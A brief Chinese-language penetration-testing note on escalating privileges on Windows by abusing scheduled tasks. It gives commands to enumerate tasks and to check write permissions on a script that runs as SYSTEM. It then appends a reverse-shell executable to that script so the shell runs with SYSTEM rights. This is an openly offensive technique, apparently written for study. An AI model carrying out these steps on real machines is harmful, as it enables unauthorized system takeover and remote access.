# 计划任务提权

原理：“Windows 可以配置为在特定时间、定期（例如每 5 分钟）或由某些事件（例如用户登录）触发时运行任务。**任务通常以创建它们的用户的权限运行**，但是管理员可以将任务配置为以其他用户身份运行，**包括 SYSTEM**

首先进行计划任务的枚举：

```bash
schtasks /query /fo LIST /v  
```

```bash
Get-ScheduledTask | where {$_.TaskPath -notlike “\Microsoft*”} | ft TaskName,TaskPath,State
```

## **案例：**

若发现一个文件（**CleanUp.ps1**），文件内容：每分钟都使用系统级权限去清除具有的日志文件。则可以查看文件权限

```bash
accesschk.exe /accepteula -quvw user  **C:\DevTools\CleanUp.ps1**
```

```bash
echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1  **//将自创建的shell覆盖至具有定时运行的文件中**
```